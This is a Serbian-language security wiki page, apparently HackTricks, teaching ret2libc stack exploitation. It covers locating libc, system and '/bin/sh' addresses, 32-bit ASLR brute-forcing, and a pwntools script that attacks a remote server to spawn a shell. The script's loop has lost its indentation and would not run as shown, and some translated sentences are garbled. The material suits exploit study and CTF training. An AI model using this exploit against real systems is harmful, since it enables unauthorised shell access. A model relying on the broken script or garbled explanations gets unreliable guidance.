# Ret2lib

{% hint style="success" %}
Učite i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

## **Osnovne informacije**

Suština **Ret2Libc** je preusmeravanje toka izvršavanja ranjivog programa na funkciju unutar deljene biblioteke (npr., **system**, **execve**, **strcpy**) umesto izvršavanja shellcode-a koji je dostavio napadač na steku. Napadač kreira payload koji menja adresu povratka na steku da pokazuje na željenu funkciju biblioteke, dok takođe obezbeđuje da su svi potrebni argumenti ispravno postavljeni prema konvenciji pozivanja.

### **Primer koraka (pojednostavljeno)**

* Dobiti adresu funkcije koju treba pozvati (npr. system) i komandu koju treba pozvati (npr. /bin/sh)
* Generisati ROP lanac da prosledi prvi argument koji pokazuje na string komande i tok izvršavanja funkciji

## Pronalaženje adresa

* Pretpostavljajući da je `libc` koji se koristi onaj sa trenutnog računara, možete pronaći gde će biti učitan u memoriji sa: 

{% code overflow="wrap" %}
```bash
ldd /path/to/executable | grep libc.so.6 #Address (if ASLR, then this change every time)
```
{% endcode %}

Ако желите да проверите да ли ASLR мења адресу libc, можете урадити:
```bash
for i in `seq 0 20`; do ldd ./<bin> | grep libc; done
```
* Poznavanjem korišćene libc, takođe je moguće pronaći offset do `system` funkcije sa:
```bash
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
```
* Poznavanjem korišćene libc, takođe je moguće pronaći offset do stringa `/bin/sh` funkcije sa:
```bash
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
```
### Koristeći gdb-peda / GEF

Poznavajući korišćeni libc, takođe je moguće koristiti Peda ili GEF da dobijete adresu funkcije **system**, funkcije **exit** i stringa **`/bin/sh`** :
```bash
p system
p exit
find "/bin/sh"
```
### Korišćenje /proc/\<PID>/maps

Ako proces kreira **decu** svaki put kada razgovarate s njim (mrežni server), pokušajte da **pročitate** tu datoteku (verovatno će vam biti potrebna root privilegija).

Ovde možete pronaći **tačno gde je libc učitan** unutar procesa i **gde će biti učitan** za svako dete procesa.

![](<../../../.gitbook/assets/image (853).png>)

U ovom slučaju, učitan je u **0xb75dc000** (Ovo će biti osnovna adresa libc)

## Nepoznata libc

Može biti moguće da **ne znate koju libc binarni fajl učitava** (jer se možda nalazi na serveru kojem nemate pristup). U tom slučaju možete iskoristiti ranjivost da **procurite neke adrese i saznate koja libc** biblioteka se koristi:

{% content-ref url="rop-leaking-libc-address/" %}
[rop-leaking-libc-address](rop-leaking-libc-address/)
{% endcontent-ref %}

I možete pronaći pwntools šablon za ovo u:

{% content-ref url="rop-leaking-libc-address/rop-leaking-libc-template.md" %}
[rop-leaking-libc-template.md](rop-leaking-libc-address/rop-leaking-libc-template.md)
{% endcontent-ref %}

### Poznavanje libc sa 2 ofseta

Proverite stranicu [https://libc.blukat.me/](https://libc.blukat.me/) i koristite **nekoliko adresa** funkcija unutar libc da biste saznali **korisničku verziju**.

## Obilaženje ASLR na 32 bita

Ovi napadi brute-force su **samo korisni za 32bitne sisteme**.

* Ako je eksploatacija lokalna, možete pokušati da brute-force-ujete osnovnu adresu libc (korisno za 32bitne sisteme):
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* Ako napadate udaljeni server, možete pokušati da **brute-force-ujete adresu `libc` funkcije `usleep`**, prosledjujući kao argument 10 (na primer). Ako u nekom trenutku **serveru treba dodatnih 10s da odgovori**, pronašli ste adresu ove funkcije.

## One Gadget

Izvršite shell jednostavno skakanjem na **jednu** specifičnu **adresu** u libc:

{% content-ref url="one-gadget.md" %}
[one-gadget.md](one-gadget.md)
{% endcontent-ref %}

## x86 Ret2lib Code Example

U ovom primeru ASLR brute-force je integrisan u kod, a ranjivi binarni fajl se nalazi na udaljenom serveru:
```python
from pwn import *

c = remote('192.168.85.181',20002)
c.recvline()

for off in range(0xb7000000, 0xb8000000, 0x1000):
p = ""
p += p32(off + 0x0003cb20) #system
p += "CCCC" #GARBAGE, could be address of exit()
p += p32(off + 0x001388da) #/bin/sh
payload = 'A'*0x20010 + p
c.send(payload)
c.interactive()
```
## x64 Ret2lib Primerak Koda

Proverite primer sa:

{% content-ref url="../" %}
[..](../)
{% endcontent-ref %}

## ARM64 Ret2lib Primerak

U slučaju ARM64, ret instrukcija skače na adresu na koju pokazuje x30 registar, a ne na adresu na koju pokazuje registar steka. Tako da je malo komplikovanije.

Takođe, u ARM64, instrukcija radi ono što instrukcija radi (nije moguće skočiti usred instrukcija i transformisati ih u nove).

Proverite primer sa:

{% content-ref url="ret2lib-+-printf-leak-arm64.md" %}
[ret2lib-+-printf-leak-arm64.md](ret2lib-+-printf-leak-arm64.md)
{% endcontent-ref %}

## Ret-into-printf (ili puts)

Ovo omogućava **curenje informacija iz procesa** pozivajući `printf`/`puts` sa nekim specifičnim podacima postavljenim kao argument. Na primer, stavljanje adrese `puts` u GOT prilikom izvršavanja `puts` će **curiti adresu `puts` u memoriji**.

## Ret2printf

Ovo u suštini znači zloupotrebu **Ret2lib da se transformiše u ranjivost format stringova `printf`** koristeći `ret2lib` da pozove printf sa vrednostima za eksploataciju (zvuči besmisleno, ali je moguće):

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

## Ostali Primeri & reference

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csaw19\_babyboi/index.html)
* Ret2lib, uz curenje adrese funkcije u libc, koristeći jedan gadget
* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64 bita, ASLR omogućeno, ali bez PIE, prvi korak je popuniti preliv do bajta 0x00 kanarija da bi se zatim pozvao puts i curio. Sa kanarijom se kreira ROP gadget za pozivanje puts da curi adresu puts iz GOT-a i ROP gadget za pozivanje `system('/bin/sh')`
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64 bita, ASLR omogućeno, bez kanarija, preliv steka u main iz podfunkcije. ROP gadget za pozivanje puts da curi adresu puts iz GOT-a i zatim poziva jedan gadget.
* [https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/hs19\_storytime/index.html)
* 64 bita, bez pie, bez kanarija, bez relro, nx. Koristi write funkciju da curi adresu write (libc) i poziva jedan gadget.
* [https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/asis17\_marymorton/index.html)
* Koristi format string da curi kanariju iz steka i preliv bafera da pozove system (to je u GOT-u) sa adresom `/bin/sh`.
* [https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html](https://guyinatuxedo.github.io/14-ret\_2\_system/tu\_guestbook/index.html)
* 32 bita, bez relro, bez kanarija, nx, pie. Zloupotreba lošeg indeksiranja da curi adrese libc i heap iz steka. Zloupotreba prelivanja bafera da uradi ret2lib pozivajući `system('/bin/sh')` (adresa heap-a je potrebna da bi se zaobišla provera).

{% hint style="success" %}
Učite i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
